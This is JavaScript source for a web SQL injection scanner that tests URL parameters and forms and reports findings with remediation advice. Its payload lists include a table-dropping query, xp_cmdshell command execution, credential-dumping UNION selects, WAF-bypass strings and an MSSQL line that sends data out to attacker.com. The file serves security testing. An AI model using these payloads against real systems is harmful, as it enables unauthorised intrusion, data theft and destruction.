import { BaseScanner } from './BaseScanner.js';

export class SQLiScanner extends BaseScanner {
  constructor(config) {
    super(config);
    this.name = 'SQL Injection Scanner';
    
    // Comprehensive SQL injection payloads based on sqlmap and real-world testing
    this.payloads = {
      // Error-based payloads
      errorBased: [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        '" OR "1"="1',
        '" OR "1"="1"--',
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' AND 1=1--",
        "' AND 1=2--",
        "admin'--",
        "admin'/*",
        "1; DROP TABLE users--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1'; SELECT SLEEP(5)--"
      ],
      
      // Union-based payloads
      unionBased: [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT username,password FROM users--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT 1,2,3,4,5--",
        "1' UNION SELECT @@version--",
        "1' UNION SELECT user()--",
        "1' UNION SELECT database()--"
      ],
      
      // Boolean-based blind
      booleanBlind: [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND SUBSTRING(@@version,1,1)='5",
        "' AND (SELECT COUNT(*) FROM users)>0--"
      ],
      
      // Time-based blind
      timeBased: [
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "' OR SLEEP(5)--",
        "1; SELECT pg_sleep(5)--",
        "'; SELECT BENCHMARK(10000000,SHA1('test'))--",
        "' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
      ],
      
      // MySQL specific
      mysql: [
        "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
        "' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXP(~(SELECT * FROM(SELECT user())a))--"
      ],
      
      // PostgreSQL specific
      postgresql: [
        "'; SELECT version()--",
        "' AND 1=CAST((SELECT version()) AS int)--",
        "' AND (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--"
      ],
      
      // MSSQL specific
      mssql: [
        "'; EXEC xp_cmdshell('whoami')--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "'; DECLARE @q varchar(200);SET @q='\\\\attacker.com\\share\\'+@@version;EXEC master..xp_dirtree @q--"
      ],
      
      // Oracle specific
      oracle: [
        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--",
        "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--"
      ],
      
      // NoSQL injection (MongoDB)
      nosql: [
        '{"$gt":""}',
        '{"$ne":null}',
        '{"$regex":".*"}',
        "' || '1'=='1",
        "';return true;var foo='",
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
      ],
      
      // WAF bypass payloads
      wafBypass: [
        "/*!50000SELECT*/ @@version",
        "SELECT%20@@version",
        "SEL%45CT @@version",
        "SELECT/**/@@version",
        "' /*!OR*/ '1'='1",
        "' OR/**/'1'='1",
        "1'/**/OR/**/1=1--",
        "' UnIoN SeLeCt 1,2,3--",
        "%27%20OR%20%271%27%3D%271"
      ]
    };
    
    // SQL error patterns for different databases
    this.errorPatterns = {
      mysql: [
        /SQL syntax.*MySQL/i,
        /Warning.*mysql_/i,
        /MySQLSyntaxErrorException/i,
        /valid MySQL result/i,
        /mysqli_/i,
        /MySQL server version/i,
        /\[MySQL\]/i
      ],
      postgresql: [
        /PostgreSQL.*ERROR/i,
        /Warning.*pg_/i,
        /valid PostgreSQL result/i,
        /Npgsql\./i,
        /PG::SyntaxError/i,
        /org\.postgresql\.util\.PSQLException/i
      ],
      mssql: [
        /Driver.* SQL[\-\_\ ]*Server/i,
        /OLE DB.* SQL Server/i,
        /\bSQL Server\b/i,
        /SQLServer JDBC/i,
        /SqlException/i,
        /Unclosed quotation mark/i,
        /Incorrect syntax near/i
      ],
      oracle: [
        /\bORA-[0-9]{5}/i,
        /Oracle error/i,
        /Oracle.*Driver/i,
        /Warning.*oci_/i,
        /quoted string not properly terminated/i
      ],
      sqlite: [
        /SQLite\/JDBCDriver/i,
        /SQLite.Exception/i,
        /System.Data.SQLite.SQLiteException/i,
        /Warning.*sqlite_/i,
        /SQLite error/i,
        /sqlite3.OperationalError/i
      ],
      generic: [
        /SQL syntax/i,
        /syntax error/i,
        /unexpected end of SQL/i,
        /quoted identifier/i,
        /invalid query/i,
        /SQL command not properly ended/i
      ]
    };
  }
  
  async scan(data) {
    const vulnerabilities = [];
    const { urls, forms, parameters } = data;
    
    // Test URL parameters
    for (const url of urls) {
      if (this.stopped) break;
      const vulns = await this.testUrlParameters(url);
      vulnerabilities.push(...vulns);
    }
    
    // Test forms
    for (const form of forms) {
      if (this.stopped) break;
      const vulns = await this.testForm(form);
      vulnerabilities.push(...vulns);
    }
    
    return vulnerabilities;
  }
  
  async testUrlParameters(url) {
    const vulnerabilities = [];
    
    try {
      const parsedUrl = new URL(url);
      const params = parsedUrl.searchParams;
      
      // First, get baseline response
      const baselineResponse = await this.makeRequest(url);
      const baselineLength = baselineResponse?.data?.length || 0;
      
      for (const [key, originalValue] of params.entries()) {
        // Test error-based injection
        for (const payload of this.payloads.errorBased.slice(0, 5)) {
          if (this.stopped) break;
          
          const testUrl = new URL(url);
          testUrl.searchParams.set(key, payload);
          
          const response = await this.makeRequest(testUrl.href);
          if (!response) continue;
          
          const errorDetected = this.detectSQLError(response.data);
          if (errorDetected) {
            vulnerabilities.push({
              type: 'SQL Injection',
              subType: `Error-based (${errorDetected.database})`,
              severity: 'critical',
              url: url,
              parameter: key,
              payload: payload,
              evidence: errorDetected.evidence,
              description: `SQL Injection vulnerability detected in parameter "${key}". Database type: ${errorDetected.database}`,
              remediation: 'Use parameterized queries (prepared statements). Never concatenate user input directly into SQL queries. Implement input validation and use an ORM.',
              references: [
                'https://portswigger.net/web-security/sql-injection',
                'https://owasp.org/www-community/attacks/SQL_Injection',
                'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'
              ],
              cvss: 9.8,
              cwe: 'CWE-89'
            });
            break;
          }
        }
        
        // Test boolean-based blind injection
        const truePayload = "' AND '1'='1";
        const falsePayload = "' AND '1'='2";
        
        const trueUrl = new URL(url);
        trueUrl.searchParams.set(key, originalValue + truePayload);
        
        const falseUrl = new URL(url);
        falseUrl.searchParams.set(key, originalValue + falsePayload);
        
        const [trueResponse, falseResponse] = await Promise.all([
          this.makeRequest(trueUrl.href),
          this.makeRequest(falseUrl.href)
        ]);
        
        if (trueResponse && falseResponse) {
          const trueDiff = Math.abs((trueResponse.data?.length || 0) - baselineLength);
          const falseDiff = Math.abs((falseResponse.data?.length || 0) - baselineLength);
          
          // If true condition behaves like baseline but false doesn't
          if (trueDiff < 100 && falseDiff > 100) {
            vulnerabilities.push({
              type: 'SQL Injection',
              subType: 'Boolean-based Blind',
              severity: 'critical',
              url: url,
              parameter: key,
              payload: truePayload,
              evidence: `Response length difference detected: TRUE condition similar to baseline, FALSE condition differs by ${falseDiff} bytes`,
              description: `Boolean-based blind SQL Injection detected in parameter "${key}"`,
              remediation: 'Use parameterized queries. Implement proper input validation.',
              references: [
                'https://portswigger.net/web-security/sql-injection/blind',
                'https://owasp.org/www-community/attacks/Blind_SQL_Injection'
              ],
              cvss: 9.8,
              cwe: 'CWE-89'
            });
          }
        }
        
        // Test time-based blind (only if aggressive mode)
        if (this.options.aggressive) {
          const timePayload = "' AND SLEEP(3)--";
          const timeUrl = new URL(url);
          timeUrl.searchParams.set(key, originalValue + timePayload);
          
          const startTime = Date.now();
          await this.makeRequest(timeUrl.href, { timeout: 10000 });
          const duration = Date.now() - startTime;
          
          if (duration >= 3000) {
            vulnerabilities.push({
              type: 'SQL Injection',
              subType: 'Time-based Blind',
              severity: 'critical',
              url: url,
              parameter: key,
              payload: timePayload,
              evidence: `Response delayed by ${duration}ms indicating time-based SQL injection`,
              description: `Time-based blind SQL Injection detected in parameter "${key}"`,
              remediation: 'Use parameterized queries. Implement proper input validation.',
              references: [
                'https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-time-delays'
              ],
              cvss: 9.8,
              cwe: 'CWE-89'
            });
          }
        }
      }
    } catch (error) {
      this.log(`SQLi URL test error: ${error.message}`, 'debug');
    }
    
    return vulnerabilities;
  }
  
  async testForm(form) {
    const vulnerabilities = [];
    
    try {
      for (const input of form.inputs) {
        if (!input.name || this.stopped) continue;
        if (input.type === 'hidden' || input.type === 'submit') continue;
        
        for (const payload of this.payloads.errorBased.slice(0, 3)) {
          const formData = {};
          form.inputs.forEach(inp => {
            formData[inp.name] = inp.name === input.name ? payload : inp.value || 'test';
          });
          
          const response = await this.makeRequest(form.action, {
            method: form.method,
            data: form.method === 'POST' ? formData : undefined,
            params: form.method === 'GET' ? formData : undefined
          });
          
          if (!response) continue;
          
          const errorDetected = this.detectSQLError(response.data);
          if (errorDetected) {
            vulnerabilities.push({
              type: 'SQL Injection',
              subType: `Error-based (${errorDetected.database})`,
              severity: 'critical',
              url: form.action,
              method: form.method,
              parameter: input.name,
              payload: payload,
              evidence: errorDetected.evidence,
              description: `SQL Injection vulnerability in form field "${input.name}"`,
              remediation: 'Use parameterized queries. Never concatenate user input into SQL.',
              references: [
                'https://portswigger.net/web-security/sql-injection',
                'https://owasp.org/www-community/attacks/SQL_Injection'
              ],
              cvss: 9.8,
              cwe: 'CWE-89'
            });
            break;
          }
        }
      }
    } catch (error) {
      this.log(`SQLi form test error: ${error.message}`, 'debug');
    }
    
    return vulnerabilities;
  }
  
  detectSQLError(html) {
    if (!html || typeof html !== 'string') return null;
    
    for (const [database, patterns] of Object.entries(this.errorPatterns)) {
      for (const pattern of patterns) {
        const match = html.match(pattern);
        if (match) {
          return {
            database: database.toUpperCase(),
            evidence: match[0]
          };
        }
      }
    }
    
    return null;
  }
}
